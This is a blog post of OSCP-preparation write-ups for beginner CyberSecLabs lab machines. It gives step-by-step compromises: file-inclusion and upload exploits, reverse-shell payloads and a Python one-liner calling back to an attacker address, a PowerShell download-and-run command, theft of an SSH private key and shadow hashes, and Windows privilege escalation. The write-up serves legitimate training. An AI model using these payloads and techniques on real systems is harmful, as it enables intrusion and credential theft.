---
layout: post
title:  "OSCP Preparation Day Three"
date:   2020-07-12 20:05:48 +0100
categories: oscp
---

For today (as I'm actually pretty stuck on this foothold on the machine "sync"), I will be going through the beginner boxes on [cyberseclabs](https://www.cyberseclabs.co.uk/labs/beginner-labs).

There are a total of 22 machines, I'm not sure how many posts this will be split into... But I guess it just depends on how long they take!


## BOATS

### NMAP
```

# Nmap 7.80 scan initiated Sun Jul 12 11:52:10 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/corn/ctf/cyberseclab/beginner/boats/results/172.31.1.14/scans/_quick_tcp_nmap.txt -oX /home/corn/ctf/cyberseclab/beginner/boats/results/172.31.1.14/scans/xml/_quick_tcp_nmap.xml 172.31.1.14
Nmap scan report for 172.31.1.14
Host is up, received user-set (0.076s latency).
Scanned at 2020-07-12 11:52:11 BST for 173s
Not shown: 987 closed ports
Reason: 987 resets
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Apache httpd 2.2.11 ((Win32) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8i PHP/5.2.9)
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/https?         syn-ack ttl 127
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql              syn-ack ttl 127 MySQL (unauthorized)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49163/tcp open  unknown            syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 12 11:55:04 2020 -- 1 IP address (1 host up) scanned in 173.75 seconds
```


### WORDPRESS

After seeing that we have wordpress running on port 80 and 443, the first thing to check is the output of wpscan.
```
wpscan --url 172.31.1.14 --api-token XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

[i] Plugin(s) Identified:

[+] thecartpress
 | Location: http://172.31.1.14/wp-content/plugins/thecartpress/
 | Last Updated: 2017-01-12T19:25:00.000Z
 |
 | [!] Title: TheCartPress 1.1.1 - Remote File Inclusion
 |     Fixed in: 1.1.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/6566
 |      - https://www.exploit-db.com/exploits/17860/
```
This wordpress is running a vulnerable version of "thecartpress" which is vulnerable to a RFI attack.

By heading to the exploit POC online at [exploitdb](https://www.exploit-db.com/exploits/17860), it shows us how to exploit this:
```
---
PoC
---
http://SERVER/WP_PATH/wp-content/plugins/thecartpress/checkout/CheckoutEditor.php?tcp_save_fields=true&tcp_class_name=asdf&tcp_class_path=RFI
---
```
Here is our exploit, hosting a webshell.php file:
```
http://172.31.1.14/wp-content/plugins/thecartpress/checkout/CheckoutEditor.php?tcp_save_fields=true&tcp_class_name=asdf&tcp_class_path=http://10.10.0.64/webshell.php
```
This webshell has upload functionality built into it, so we upload a msfvenom payload
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.0.64 LPORT=4444 -f exe > shell.exe
```
And run it to get a shell as SYSTEM
```
C:\Windows\Tasks>whoami & hostname

nt authority\system
Boats
```

## CMS


### NMAP
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

# Nmap done at Sun Jul 12 12:26:39 2020 -- 1 IP address (1 host up) scanned in 37.84 seconds
```

### WORDPRESS

Since this is running wordpress we can use wpscan again to look for any vulnerable plugins
```
wpscan --url 172.31.1.8

[i] Plugin(s) Identified:

[+] wp-with-spritz
 | Location: http://172.31.1.8/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
```
I tried running the plugin against the wpvulndb, but it didn't mention a single exploit. I assume that the database is just missing something as this plugin is vulnerable to LFI/RFI which can be found [here](https://www.exploit-db.com/exploits/44544).
```
3. Proof of Concept

/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
```

### LFI

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
angel:x:1000:1000:angel:/home/angel:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```
Here we can see the user "angel" `angel:x:1000:1000:angel:/home/angel:/bin/bash` and we can check to see if we can get a ssh key from the home directory.
```
view-source:http://172.31.1.8/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../home/angel/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzvdotSTf5cpgq7BjsjR8y7ViuIteCoGX3Co4IiJy+o0datDU
kQKO1tDGhysJGullzfkxB2uyoxGXmTprDGIoBFMyoaFtOw+lfnzjiWtXtzF+pirt
3lGfZUYhw6zzqmyte6o2w/kaMc+G+Q4ogwdcpp0LHFmhAGTmj9dyp9ADPKpZ4RZU
ro3rWha47rW7G/4PlULIijtRXVdqMnFjNA1Ra52QnG0xokgSmHxlcsX8suJIDRO5
OJju48C8yopvlpRSZca1kU7OJ/4MtphOPhLf8UB8r0+fHqbTeECBIHXTeIJoEB8x
ADPmkt0NzX6cYI3j07jB54SPrU96eRs20+nWyQIDAQABAoIBADB/XyTbYC/bjW2N
5r6yd+/QMDLoTYAOwAQSTJcLFYBKovMNvlHAlLIXt/2igv6wZG+wjeGcRf7aN3jr
bHw5YAErcbjYN91YHEKYh0UDR0mhKnlLo/OtkrlLhsvwciSkVL6esziW3aGAbLNd
svaJOhe8wwbApe6OtkxMgwx5vNhw8oO40ifOuAv4r1ryoTbCJNv8EapYHxxtGYXU
Js44Zlas05988WBI+xa0iDJplvqZ1ncl5OrokYJG7pLAuFJvU0vqfTB9l3nYWuGO
/Lh/FpCXfBVZNoqeuL0DUsulUGqW8SvuuesPrSZr71U3kxjJwq6U0xsi528o0QMV
KN+AX3UCgYEA9fQ0EiDavyzG6M6hOOLSvJburzdeVMnw/0FTpTwsTMAM0X+4qTTK
pN4GQ07zyuhv1HfOuxtyHFbuhzqrM2i4QWXqWs6pPTDs0FHAyaPNgXpfojPJRFTk
WTewVRMrMwJ0uxhLIJfV9+iBLB4KFyxJ3gcRwNPBAodJgrW41F0WrLMCgYEA12uJ
S22YgMx2yCWDxxjS2Lvu86BIKqizYjVAZ6lxjcdvTTwRjaiDH55LrTwUUUs1Z7be
vPze3jz/iYidnvqsFAM/kni4IxpghcsDlq5x3CkyF2WuqhKz73Z9RYYpzXz7bRMJ
D219yPTa+id/LxCLYPYm6vCwsCvFL4aaWKa2pJMCgYEA20CEopxzI/UQpDx+8C0T
W1bZE40yJDeZBJMBs8y+WPTi+Gb5AK2079+Uia/6GCm4dxkOSzGeObEtFZOxRjTV
/EaT8btElu3kTZhzWc0Rx5iFZBzyEF306auBH3XlDqXj1V1Eq5tu/H5hmCh3Kk0q
1ChNJS4fYtejKkhAqd8J9Y0CgYALByNJLDwhY9Y02s7LM3cfx0ctS6hGHsrIHUfF
xsPcaThGcOvJH7ZOuRDQtoGnw7zhKVhvvlY+dEr0pHzFNbn3cE8h1XI/wcrtLn5p
iVak2asJzZfKdxilCqDRHVQog9xvMglFs+o7jmVjZwA4zZUFCrTlVBsHecYnb7GZ
FjfFZwKBgATlUyGFfWfrKbU6heNL4GpdZnvs1zV6rU4et8oVPCjYVslt34aubkG4
wQY5bMC6MGG2bH5yU/xN48+qNfFwoT977qpfEndWI0fg4h/GUDuOpzQUtKkZrHD0
ucwgWYMGOROeYewjyh/ftVhLzh4o4Y++kmwY0LY2A92WMBjBy3Qt
-----END RSA PRIVATE KEY-----

```

With this we can log in as angel.

### PRIV ESC

After running sudo -l we see angel has ALL permissions no passwd so just use the command `sudo bash` to spawn a shell as root.
```
angel@cms:~$ sudo -l
Matching Defaults entries for angel on cms:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angel may run the following commands on cms:
    (ALL : ALL) NOPASSWD: ALL

angel@cms:~$ sudo bash
root@cms:~#
```

## COLD

### NMAP
```
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.30)
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http           syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.30)
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
5500/tcp  open  http               syn-ack ttl 127 Jetty 9.3.6.v20151106
8500/tcp  open  http               syn-ack ttl 127 Samsung AllShare httpd
49152/tcp open  unknown            syn-ack ttl 127
49153/tcp open  unknown            syn-ack ttl 127
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  unknown            syn-ack ttl 127
49161/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 12 13:23:12 2020 -- 1 IP address (1 host up) scanned in 318.49 seconds
```

### COLDFUSION

This actually took me some time to find. To my mistake I relied on the version scan from nmap, which was incredbly wrong. And since the "/" directory of the website was returning a 404 I had no thoughts to double check at first. After checking around all the other ports, I came back and checked on speedguide.net to see that there is some recognisible services that usually run on [port 8500](https://www.speedguide.net/port.php?port=8500).

After googling on this port and exploits I can use for it, I found a Arbitrary upload exploit which I will try next. The exploit in question can be found [here](https://www.exploit-db.com/exploits/45979). 
```
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm
HTTP/1.1
Host: coldfusion:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: multipart/form-data;
boundary=---------------------------24464570528145
Content-Length: 303
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------24464570528145
Content-Disposition: form-data; name="file"; filename="shell_file"
Content-Type: image/jpeg

%shell code here%
-----------------------------24464570528145
Content-Disposition: form-data; name="path"

shell
-----------------------------24464570528145--


a shell will be located here http://coldfusion:port/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/shell_file
```

So using this, I will be uploading a jsp file which will return us a shell on the box:
```
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1
Host: 172.31.1.15:8500
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------24464570528145
Content-Length: 1854

-----------------------------24464570528145
Content-Disposition: form-data; name="file"; filename="corn.jsp"
Content-Type: "text/html;charset=UTF-8"

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.64 LPORT=4444 -f raw > shell.jsp **PUT IN THE shell.jsp CONTENTS HERE**
-----------------------------24464570528145
Content-Disposition: form-data; name="path"

shell
-----------------------------24464570528145--
```

Now we can see that we have a shell as jade
```
C:\ColdFusion2018\cfusion\bin>whoami & hostname 

cold\jade
Cold
```

### PRIV ESC

Now we have a shell, we can upload the scripts that we need. To do this i'll use the smbserver method, as I haven't done it before.
```
ATTACKING MACHINE:
sudo python /opt/impacket/examples/smbserver.py corn /opt/scripts/windows/
VICTIM MACHINE:
copy \\10.10.0.64\corn\winPEASany.exe .\winpeas.exe
```
In the output of winpeas we see that there is a vulnerable service that we can modify:
```
[+] Modifiable Services(T1007)
 [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
  LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
  cold: WriteData/CreateFiles
```

Using `sc qc cold` we can see that the service is running as LocalSystem:
```
C:\Windows\Tasks>sc qc cold
sc qc cold
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: cold
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : cold
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
Now that we have this knowledge, we can change the path of the command that will run when the service is started.
```
sc config cold binpath= "C:\windows\tasks\shell.exe"
```
Now we can upload our shell generated with `msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe` and restart the service:
```
copy \\10.10.0.64\corn\shell.exe C:\windows\tasks\shell.exe

wmic service cold call startservice
```
Now on our listener we should have a shell as system:
```
C:\Windows\system32>whoami && hostname

nt authority\system
Cold
```

## DEBUG

### NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 15:20 BST
Nmap scan report for 172.31.1.5
Host is up (0.098s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.36 seconds
```

After seeing there is 2 ports on the box, I ran gobuster on port 80:
```
gobuster dir -u http://172.31.1.5/ -w /opt/SecLists/Discovery/Web-Content/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://172.31.1.5/
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/12 15:21:56 Starting gobuster
===============================================================
/about (Status: 200)
/blog (Status: 200)
/console (Status: 200)
/contact (Status: 200)
```
From this, we see an interesting "console" directory which when visited shows a python console that we can use to get a shell on the box:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.64",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
Now we have a shell on the box as "megan".

### PRIV ESC
There is a SUID binary `xxd` on this machine that we can exploit to read any file we like on the machine. With this I read the /etc/shadow file
```
megan@debug:/dev/shm$ FILE=/etc/shadow
FILE=/etc/shadow
megan@debug:/dev/shm$ xxd "$FILE" | xxd -r
xxd "$FILE" | xxd -r
root:$6$YbP4.h/m$HTWC5ubw1dJK1Ed11RExV/55T0JlRnjtPcCyQEugG470lfZG2Eo8Id2ZeEb2vBnHRTVZls2kZNnaC7GZRCjwf/:18358:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18357:0:99999:7:::
megan:$6$agnTjgTe$wyLY7h/29DB/5ZfcArQYPBpMYxfsvJH5FoPKA9zufGOte5OLZbFUnA10xapEsPkDm7monYX9q1y5cFZTOKRPF.:18359:0:99999:7:::
```
Now we can try crack the hashes and see we cracked the root password:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 0.10% (ETA: 18:55:36) 0g/s 1346p/s 2692c/s 2692C/s christal..fleming
shanghai         (root)
```
Now we can run `su root` with the password to log in as root.

If this didn't work, we could crack the megan password (if possible) and use sudo to spawn a shell.

If that also didn't work we could use our `lxd` group privileges to mount the "/" directory to a container and get root that way.


## DEPLOYABLE

### NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 15:39 BST
Nmap scan report for 172.31.1.13
Host is up (0.077s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49163/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.18 seconds

```

### TOMCAT

NMAP shows that tomcat is running on port 8080, so we head there and see if we can log in the the admin section of the website.

Knowing that one of the tomcat default passwords is `s3cret`, I tried that and we get in to the manager section of the site.
From here we can upload a .war payload and run it to get the shell on the box as tomcat:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
```

### PRIV ESC

Now we have a shell, I uploaded winpeas to see there is an exploit in the "deploy" service due an unquoted service path:
```
Deploy(Deploy)[C:\Program Files\Deploy Ready\Service Files\Deploy.exe] - Manual - Stopped - No quotes and Space detected
```
With this we can upload a shell.exe file to `C:\Program Files\Deploy Ready\`, name it "Service.exe" and run the command `sc start deploy` to get it to run our reverse shell as SYSTEM.

```
C:\Program Files\Deploy Ready>copy \\10.10.0.64\corn\shell.exe Service.exe

C:\Program Files\Deploy Ready>sc start deploy
```


## ENGINE

### NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 16:07 BST
Nmap scan report for 172.31.1.16
Host is up (0.094s latency).
Not shown: 993 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.15 seconds
```

### BLOGENGINE

After heading to port 80, there is a default IIS windows server landing page. So as usual I decided to run gobuster against it:
```
gobuster dir -u http://172.31.1.16/ -w /opt/SecLists/Discovery/Web-Content/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://172.31.1.16/
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/12 16:08:51 Starting gobuster
===============================================================
[ERROR] 2020/07/12 16:09:08 [!] Get http://172.31.1.16/Blog: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/aspnet_client (Status: 301)
/blog (Status: 200)
```
At /blog there is a "BlogEngine" service running. After searching online for exploits I found a path traversal exploit which can be found [here](https://www.exploit-db.com/exploits/46353).
```
/*
 * CVE-2019-6714
 *
 * Path traversal vulnerability leading to remote code execution.  This 
 * vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This 
 * is caused by an unchecked "theme" parameter that is used to override
 * the default theme for rendering blog pages.  The vulnerable code can 
 * be seen in this file:
 * 
 * /Custom/Controls/PostList.ascx.cs
 *
 * Attack:
 *
 * First, we set the TcpClient address and port within the method below to 
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the 
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView.ascx. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:
 *
 * http://10.10.10.10/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the 
 * blog with a theme override specified like so:
 *
 * http://10.10.10.10/?theme=../../App_Data/files
 *
 */
```

As the exploit suggests, we need to do the following things:
```
Log in to the admin section.

Upload a reverse shell named PostView.csx

Then use the path traversal on /blog/?theme=../../App_Data/files
```
Using the credentials "admin:admin" we can log in and complete the exploit.

### PRIV ESC
After uploading winpeas.exe and running it, it shows some "AutoLogon" credentials for the user "administrator"
```
[+] Looking for AutoLogon credentials(T1012)
  Some AutoLogon credentials were found!!
  DefaultUserName               :  Administrator
  DefaultPassword               :  PzCEKhvj6gQMk7kA
```
With this we can use psexec.py from impacket to spawn a shell as SYSTEM:
```
psexec.py Engine/Administrator:PzCEKhvj6gQMk7kA@172.31.1.16
```
I did this as I had never used the program before, but obviously we can just login over winrm using evil-winrm aswell:
```
evil-winrm -i 172.31.1.16 -u administrator -p PzCEKhvj6gQMk7kA
```

## ETERNAL

### NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 17:21 BST
Nmap scan report for 172.31.1.10
Host is up (0.056s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49161/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.64 second
```

Using nmap we can check if the box is vulnerable to eternal blue (the name is a pretty big giveaway)
```
$nmap -Pn -p 139,445 --script smb-vuln-ms17-010 172.31.1.10
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 17:28 BST
Nmap scan report for 172.31.1.10
Host is up (0.054s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```
It is vulnerable, so now we can use the metasploit module for eternal blue: `windows/smb/ms17_010_eternalblue`

After running we recieve a shell as SYSTEM.


## IMPOSTER

### NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 17:32 BST
Nmap scan report for 172.31.1.20
Host is up (0.057s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1025/tcp open  NFS-or-IIS
1026/tcp open  LSA-or-nterm
1027/tcp open  IIS
1028/tcp open  unknown
1029/tcp open  ms-lsa
1036/tcp open  nsstp
1037/tcp open  ams
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.44 seconds
```

### WING FTP
Wing FTP is running on port 8080. To log in here we can supply the credentials "admin:password".

From here we can exploit the lua console to get RCE on the machine.

As a note, I did this before on VHL and was able to use the command `os.execute("powershell.exe%20(New-Object%20System.Net.WebClient).DownloadFile('http://10.10.0.64/shell.exe',%20'C:\Windows\Tasks\shell.exe')")` to upload my reverse shell to the box. It wasn't possible in this for whatever reason so I just used the metasploit module for this. After reading write-ups after there is a way to start an ftp service and mount the entire C:/ filesystem to it, which allows you to upload or download files from it, I'll leave a link to that method [here](https://medium.com/@tsustyle/cyberseclabs-imposter-writeup-80eec9102efe).

I won't mention how to use the metasploit module as it's pretty simple, so onto system.


### PRIV ESC
Since we have meterpeter shell from the exploit already, we can run the `getprivs` command to see what kind of privs we have:
```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreateTokenPrivilege
SeDebugPrivilege
SeEnableDelegationPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
```

From here we can see we have the `SeDebugPrivilege` which we can exploit using meterpreter:
```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
IMPOSTER\lian
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```
Finally, type shell and we will have a shell as SYSTEM:
```
meterpreter > shell
Process 732 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami & hostname

nt authority\system
Imposter
```

## LAZY

### NMAP
```
Nmap scan report for 172.31.1.1
Host is up (0.054s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 8f:fd:3e:5e:b1:0e:c8:ff:5d:34:2a:7e:65:b3:58:7a (DSA)
|   2048 93:41:e8:35:92:a3:ed:b8:de:42:7d:9f:fc:82:67:24 (RSA)
|_  256 6a:0c:be:0d:83:b8:9d:03:c8:9f:47:e0:8b:f1:a3:c0 (ECDSA)
80/tcp  open  http        nginx 1.1.19
|_http-server-header: nginx/1.1.19
|_http-title: Welcome to nginx!
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.6.25 (workgroup: WORKGROUP)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h29m58s, deviation: 4h56m59s, median: -1s
|_nbstat: NetBIOS name: LAZY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.25)
|   Computer name: lazy
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: lazy
|_  System time: 2020-07-12T11:24:04-07:00
